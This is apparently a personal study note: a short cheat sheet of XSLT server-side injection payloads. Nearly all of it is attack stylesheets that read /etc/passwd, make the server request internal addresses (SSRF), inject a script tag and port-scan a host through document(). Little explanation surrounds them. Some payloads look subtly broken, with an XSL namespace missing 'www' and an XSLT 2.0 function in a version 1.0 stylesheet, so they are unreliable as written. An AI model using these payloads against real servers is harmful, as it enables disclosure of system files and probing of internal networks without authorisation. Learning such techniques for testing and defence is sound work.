Daily Notes : Day 88
XSLT Server Side Injection
 (Extensible Stylesheet Language Transformations) - Part 1

The most used frameworks are: Libxslt (Gnome), Xalan (Apache) and Saxon (Saxonica).

 1. Read Local File: read.xsl
<xsl:stylesheet xmlns:xsl="http://w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

 2. SSRF
<xsl:stylesheet xmlns:xsl="http://w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>

OR 

<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>

3. Javascript Injection 
<xsl:stylesheet xmlns:xsl="http://w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>

4. Port Scan 
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>